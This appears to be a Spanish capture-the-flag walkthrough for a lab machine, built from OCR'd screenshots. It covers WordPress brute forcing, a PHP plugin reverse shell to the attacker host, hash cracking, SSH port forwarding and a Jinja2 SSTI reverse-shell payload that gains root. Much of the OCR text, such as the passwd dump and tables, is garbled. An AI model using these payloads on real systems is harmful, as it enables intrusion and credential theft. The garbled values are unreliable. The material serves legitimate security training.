# TheFirstAvenger.md

## Descripción general

Esta máquina presenta un entorno vulnerable con una interfaz web, acceso SSH y un vector de explotación basado en SSTI (Server-Side Template Injection). El objetivo es obtener acceso root desde una enumeración inicial básica.

## Enumeración inicial

### 1-nmap.png
```
> nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.20.10.6 -oN escaneo. txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 14:19 CEST

NSE: Loaded 157 scripts for scanning.

NSE: Script Pre-scanning.

NSE: Starting runlevel 1 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.00s elapsed

NSE: Starting runlevel 2 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.00s elapsed

NSE: Starting runlevel 3 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.00s elapsed

Initiating ARP Ping Scan at 14:19

Scanning 172.20.10.6 [1 port]

Completed ARP Ping Scan at 14:19, 0.06s elapsed (1 total hosts)

Initiating SYN Stealth Scan at 14:19

Scanning 172.20.10.6 [65535 ports]

Discovered open port 22/tcp on 172.20.10.6

Discovered open port 80/tcp on 172.20.10.6

Completed SYN Stealth Scan at 14:19, 1.14s elapsed (65535 total ports)
Initiating Service scan at 14:19

Scanning 2 services on 172.20.10.6

Completed Service scan at 14:19, 6.02s elapsed (2 services on 1 host)

NSE: Script scanning 172.20.10.6.

NSE: Starting runlevel 1 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.16s elapsed

NSE: Starting runlevel 2 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.01s elapsed

NSE: Starting runlevel 3 (of 3) scan

Initiating NSE at 14:19

Completed NSE at 14:19, 0.00s elapsed

Nmap scan report for 172.20.10.6

Host is up, received arp-response (9.000045s latency).

Scanned at 2025-08-05 14:19:30 CEST for 8s

Not shown: 65533 closed tcp ports (reset)

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:

| 256 a1:96:4a:cb:4a:c2:76: f6:35:61:64:53:31:53:a5:5e (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbm1zdHAyNTYAAABBBH28BbDxXnAVHt0OZmDFo2nEtVMSR2bBvOCs/7cvuKru2GuUPyJCPiqDUJgYSPKQB45AH6KxcJxSa5895ibTFUE=
| 256 63:00:29: 0f:1b:2b:58:7c:aa:6c:28:78:bf:ce:6e:5e (ED25519)

|_ssh-ed25519 AAAAC3NzaC11ZDI1NTESAAAATGIUU9F4rvdzxt lwdz2J3AzswqbUEY j 2YbIYTm6HIYUD
80/tcp open http  syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))

| http-methods:

|_ Supported Methods: OPTIONS HEAD GET POST

|-http-server-header: Apache/2.4.58 (Ubuntu)

| "http-title: Bienvenido Cibervengador

MAC Address: 08:00:27:CA:B7:14 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: 0S: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 10-netcat.png
```
> nc -lvnp 4444
listening on [any] 4444 ...

connect to [172.20.10.5] from (UNKNOWN) [172.20.10.6] 39076

bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
<ger:/var/www/html/wp1/wp-content/plugins/backdoor$ whoami

whoami

www-data

<ger:/var/www/html/wp1/wp-content/plugins/backdoor$
```

### 11-passwd.png
```
cat /etc/passwd

root:x root: /root:/bin/bash

daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin: /bin:/usr/sbin/nologin

dev: /usr/sbin/nologin

:sync: /bin: /bin/sync

:/usr/sbin/nologin

usr/sbin/nologin

var/spool/lpd: /usr/sbin/nologin

:x:8:8:mail:/var/mail:/usr/sbin/nologin

ews : /var/spool/news : /usr/sbin/nologin

10:10: uucp:/var/spool/uucp: /usr/sbin/nologin
3:13:proxy:/bin:/usr/sbin/nologin

| apt :x:42:65534: S ATER /usr/sbin/nologin

Nobody : x: 65534: 65534: nobody: /nonexistent: /usr/sbin/nologin
systemd-network
systemd-timesync:
dhcped:x:
messagebus
systemd-resolve:

ser for polkitd:/: Pew acin7aetentn
03:46:usbmux daemon, , , :/var/lib/usbmux: /usr/sbin/nologin
```

### 12-wp-config.php-password.png
```
// ** Database settings - You can get this info from your web host ** //
7** The name of the database for WordPress */
define( 'DB_NAME', ‘wordpress’ )

7** Database username */
define( 'DB USER’, ‘wordpress’ );

/** Database password */
define( 'DB PASSWORD’, '9pXYwXSnap’ 4pqpg~7TcM9bPVXY&~RM9i3nnex%r

/** Database hostname */
define( 'DB_HOST', ‘localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', ‘utf8mb4' );

/** The database collate Bias Don't change this if in doubt. */
define( 'DR COLLATE'. '' )=
```

### 13-mysql-topsecret.png
```
Welcome to the MySQL monitor. Commands end with ; or \g.$ mysql -u -wordpress -p
Your MySQL connection id is 524
Server version: 8.0.39-Oubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its

affiliates. Other names may be trademarks of their respective

owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;

Database

+
|

+ —

| information schema |
| performance schema |
| top_secret

| wordpress

+

4

rows in set (0.04 sec)
mysql> use top secret

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables

--+

avengers

|
+
1 row in set (0.00 sec)

Copel cellent! © han) eweMiEn

| name | username | password
Saasatisaagasa9039903 Paasaaasa9955 Paasaaasaac3a90399099909390932093003 +
Iron Man | ironman — | cc20F43c8c24dbc0b2539489b113277a
Thor | thor | 077b2e2a02ddb89d4d25dd3b37255939
Hulk | hulk | ae2498aatf4ba7890d54ab5c91e3ea60
Black Widow | blackwidow | 022e549d06ec8ddecb5d510b048f131d
Hawkeye | hawkeye —|_ d74727c034739e29ad1242b643426bc3
Steve Rogers | steve | 723a44782520fcdfb57daa4eb2at4be5
eee eee eee eee Poananasaoasctasasaaasasasasaadsacassscsaas5900%

in set (0.01 sec)
```

### 14-crackpasswd_john.png
```
>» echo '723a44782520fcdfb57daa4eb2af4be5' > hash
> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])

Warning: no OpenMP support for this hash type, consider --fork=8

Press ‘q' or Ctrl-C to abort, almost any other key for status

thecaptain (2)

1g 0:00:00:00 DONE (2025-08-05 18:13) 25.00g/s 19315Kp/s 19315Kc/s 19315KC/s thekidbilly..theadicts1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably

Session completed.
```

### 15-ssh-steve.png
```
> ssh steve@172.20.10.6
steve@172.20.10.6's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

* Documentation: https://help.ubuntu. com
* Management: https: //landscape.canonical.com
* Support: https: //ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into

To restore this content, you can run the ‘unminimize' command.

steve@TheHackersLabs -Thefirstavenger:~$
```

### 16-puerto7092.png
```
steve@TheHackersLabs-Thefirstavenger:~$ ss -tuln

Netid State Recv-Q Send-Q Local Addres Peer Address: Process

udp UNCONN i: i: 127.0.0.5. 0.0.0.0
udp UNCONN i: i: 127.0.0.53%10:53 0:
udp UNCONN i: i: 192.168.56.101%enpOs: 0
udp UNCONN i: i: 172.20.10.6%enpOs: i}
udp UNCONN i: i) [fe80: :a00:27ff: feca:b714]%enpOs

tcp LISTEN i: 4096 127.0.0.5.

tcp LISTEN i: 151 127.0.0.

tcp LISTEN i: 70 127.0.0.

tcp LISTEN i: 4096 127.0.0.53%10:53

tcp LISTEN i: 128 127.0.0.

tcp LISTEN i: 511

tcp LISTEN i: 4096

steve@TheHackersLabs -Thefirstavenger:~$
```

### 17-port-forwarding.png
```
>» ssh -L 7092:127.0.0.1:7092 steve@172.20.10.6
steve@172.20.10.6's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

* Documentation: https://help.ubuntu. com
* Management: https: //landscape. canonical. com
* Support: https: //ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into

To restore this content, you can run the ‘unminimize' command.
```

### 18-SSTI.png
```
CB 127.0.0.1

kali Linux #8 Kali Kali Docs XQ Kali Forums @& Kali NetHunter ® Exploit-DB ® Google Hacking |

Ejecutar ping

Direccion IP:
49

Error al ejecutar: /usr/bin/ping: {{7*7}}: Name or service not known
```

### 19-jinja-SSTI.png
```
ate-injection-table,

2 cheatsheet-hackmanit.de/temple

Template Injection Table

Information Universal Error-Based Polyglots
Template Engine Language DB <'s(H@n%>tt © <w'sgH@nr> © sqt<%[%""}}%I © <#set($x<%=({=(@QHs
Error Error Error
Jinja2 Python Error Error Error Error
Error Error Error

Jinja2 (Sandbox) Python Error
```

### 2-puerto80.png
```
© Bienvenido Cibervengador! < +

€- Ca O & 172.20.106
Kali Linux 8 Kali Tools Kali Docs ¥{ Kali Forums @ KaliNetHunter ® Exploit-DB Google HackingDB © GTFOBins @ Online-Reverse Shel... CrackStation # Magic-CyberChef [iJ Brainfuck Dec:

Bienvenido Cibervengador'!

Un grupo para compartir CTI, IOCs, noticias e incidentes.

() offsec

Un grupo donde absolutamente todo sera sin coste para nadie, por y para la
comunidad.
```

### 20-revshell-SSTI.png
```
€ xX @ DB 127.0.0.1

offsec Kali Linux # Ni kaliForums & Kali NetHunter © ExploitDB © G g O e Crackstati

Ejecutar ping

Direccion IP:

config._class_._init_.__globals_[os'].popent'bash -c "sh -i >& /dev/tep/172.20.10.5/4444 O>&1

Error al ejecutar: /usr/bin/ping: {{ config. class_. init. globals_['os'].popen(‘id').read() }}: Name or service not known
```

### 21-escalada-root.png
```
> nc -lvnp 4444
listening on [any] 4444 ...

connect to [172.20.10.5] from (UNKNOWN) [172.20.10.6] 35956
sh: 0: can't access tty; job control turned off

# whoami
```

### 3-gobuster.png
```
> gobuster dir -u http://172.20.10.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php, txt

Gobuster v3.6
by 0J Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] url: http://172.20.10.6/

[+] Method: GET

[+] Threads: 10

[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium. txt
[+] Negative Status codes: 404

[+] User Agent: gobuster/3.6

[+] Extensions: htm1, php, txt

[+] Timeout 10s

Starting gobuster in directory enumeration mode

7 htm (Status: 403) [Size: 276]
index.html (Status: 200) [Size: 474
7.php (Status: 403) [Size: 276]
7wpl (Status: 301) [Size: 308] [--> http://172.20.10.6/wp1/
7.php (Status: 403) [Size: 276]
7 htt (Status: 403) [Size: 276]

Progress: 259914 / 830576 (31.29%)
```

### 3-gobuster2.png
```
> gobuster dir -u http://172.20.10.6/wpl -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt

Gobuster v3.6
by 0J Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

http://172.20.10.6/wp1
GET

10

[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium. txt
[+] Negative Status codes: 404

gobuster/3.6

htm1, php, txt

10s

403)
403)
301)

276]
276)
®) [--> http://172.20.10.6/wp1/]

7 htt
/index.php

/wp-content 301) 319] [--> http://172.20.10.6/wp1/wp-content/
/license. txt : 200) 19915

/wp- Login. php 200) 6694]

/wp-includes 301) 320] [--> http://172.20.10.6/wp1/wp-includes/

/readme. html 200) 7409}

/wp-trackback. php 200) 136]

/wp-admin 301) 317] [--> http://172.20.10.6/wp1/wp-admin/

/xmlrpc.php 405) 42]

7 htm 403) 276)

7.php (Status: 403) : 276]

/wp-signup.php (Status: 302) : 0] [--> http://thefirstavenger. thl/wp1/wp-login.php?action=register]

830572 / 830576 (100.00%)
```

### 4-wp-login.php-admin.png
```
Error: la contrasefia que has introducido para el

nombre de usuario admin no es correcta, Has

‘lvidado tu contrasenia?

Nombre de usuario o correo electrénico

CO Recuérdame

{Has olvidado tu contrasefia?

Ira The First Avenger

felemet |
```

### 5-wpscan-password.png
```
[i] Plugin(s) Identified:

[+] stop-user-enumeration
| Location: http://thefirstavenger.thl/wp1/wp-content/plugins/stop-user-enumeration/
Last Updated: 2025-07-14T20:09:00.000Z
[!] The version is out of date, the latest version is 1.7.5

Found By: Urls In Homepage (Passive Detection)
Confirmed By: Urls In 404 Page (Passive Detection)

|
|
|
|
| Version: 1.6.3 (100% confidence)
| Found By: Query Parameter (Passive Detection)

| _- http://thefirstavenger. thl/wp1/wp-content/plugins/stop-user-enumeration/frontend/js/frontend. js?ver=1.6.3
| Confirmed By:

| Readme - Stable Tag (Aggressive Detection)

| _- http://thefirstavenger. thl/wp1/wp-content/plugins/stop-user-enumeration/readme. txt

| Readme - ChangeLog Section (Aggressive Detection)

| - http://thefirstavenger. thl/wp1/wp-content/plugins/stop-user-enumeration/readme. txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:03 <

> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

+] Perfor assword attack on Xmlrpc against 1 user/s
SUCCESS] - admin / spongebob
rying admin 7 sponge ime: 00:00:02 < > (91 / 14344483) 0.00% ETA: 22:77:27

[!] Valid Combinations Found:
| Username: admin, Password: spongebob

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

{+] Finished: Tue Aug 5 14:41:48 2025
```

### 5-wpscan.png
```
> wpscan --url http://thefirstavenger.thl/wpl/ \

--max-threads 5 \

--throttle 1 \
-no-update \
-no-banner

--passwords /usr/share/wordlists/rockyou. txt \
-usernames admin \

-disable-tls-checks \

-random-user-agent \

[+] URL: http://thefirstavenger.thl/wpl/ [172.20.10.6]

[+] Started: Tue Aug

Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%

5 14:41:38 2025

[+] XML-RPC seems to be enabled: http://thefirstavenger.thl/wp1/xmUrpc. php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:

- http://codex.wordpress.org/XML-RPC_Pingback API

https
https
https
https

://www.
://www.
://www.
://www.

rapid7.
rapid7.
rapid7.
rapid7.

com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
com/db/modules/auxiliary/scanner/http/wordpress_pingback access/
```

### 6-wp-admin.png
```
ca O &@ thefirstavenger.thl B9@eaAxA =

Kali Tools # KaliDocs ¥ Kali Forums @® Kali NetHunter Exploit-DB Google Hacking DB GTFoBins @ . a on fF Magic-CyberChef J Brainfuck Decoder

1 Oo # + Aijadir Hola, admin fil

Ayuda ¥
@ Escritorio
iYa esté disponible WordPress 6.8.2! Por favor, actualiza ahora.
Inicio
A anes @ Para
Escritorio
A Entradas Estado de salud del va Borrador rapido Ava
8) Medios
Las pruebas de salud del sitio se ejecutaran Titulo
IB Pagina autométicamente de forma periédica para obtener
Ain no hay informacién... informacién sobre tu sitio. También puedes visitar
® comentaris ra\asantaladesaluddel sitio para obtener Contenido Acaxmaquilacisa Acaxmaquilacisa
> pemtneh {En qué ests pensando?
Plugins @ De un vistazo Ava
Usuarig # tentrada ® 1 comentario

*

{Rea EES WordPress 6.6.2 est funcionando con el tema Twenty. Actualizar a 6.8.2

Aj ‘Twenty-Four.
Ce ven @ Motores de busqueda disuadidos Eventos y noticias de WordPress AV oo

Asiste a un préximo evento cerca de ti. Q Seleccionar la ubicacién

Act

idad “Nv s $B WordPress Diversity Day Valencia 2025 sdbado, 18 Oct 2025

WordCamp « Valencia, Spain

Publicaciones recientes

sola, mundo! #% Wordcamp Valencia 2025. WordPress 8-9 de noviembre de 2025
oe Tech Congress.
WordCamp « Valencia, Spain
Comentarios recientes
{Quieres mas eventos? jAyuda a organizar el préximo!

De Un comentarista de WordPress en jHola, mundo!

[Pah ec ENT eT ENCE HET OEE ;Participa en el Summer Photo Contest y deja que tus fotos hablen del verano!

comentarios, por favor, visita en el escrtorio la WordPress 6.8.2 ya esta disponible!

‘Open Channels FM: The Real Impact of Sponsored Contributors on WordPress
Progress and Innovation

Todos (1) | Mios(0) | Pendientes (0) | Aprobado (1) | Spam (0) | Papelera (0)

(Open Channels FM: How to Handle Customer Support as a Growing WordPress
Plugin Business

Gutenberg Times: Roadmap for WordPress 6.9, Block Bindings, Mega Menus, and
More—Weekend Edition 336

Meetups 2 | WordCamps C2 Noticias

crear con WordPress. Obtener la versién 6.8.2
```

### 7-revshell.png
```
> ts -L
:49 2025 [) backdoor.zip

.fW-rw-r-- jgarri jgarri 263 B Tue Aug 5 1
.twW-rw-r-- jgarri jgarri 103 B Tue Aug 5 1 3 2025 @ rev.php
> cat rev.php
File: rev.php

1 <?php

2 i*

3 Plugin Name: Backdoor

4 */

5 exec("/bin/bash -c ‘bash -i >& /dev/tcp/172.20.10.5/4444 O>81'

6 >
```

### 8-subir-plugin.png
```
+ Afadir

ia esté disponible WordPress 6.8.2! Por favor, actualiza ahora
Entradas
Medio Afiadir plugins
Paginas
Comentar
Si tienes un plugin en formato .zip, puedes instalarlo 0 actualizarlo subiéndolo aqui.

Apariencia
Plugins 1 “~~

Examinar... | backdoor.zip

Plugi

Afjadir nuevo plugin

& Usuarios

& Herramientas
```

### 9-ejecutamos-revshell.png
```
¢€ > x @ Q  thefirstavenger.thl/wp1/wp-content/plugins/backdoor/rev.php
```

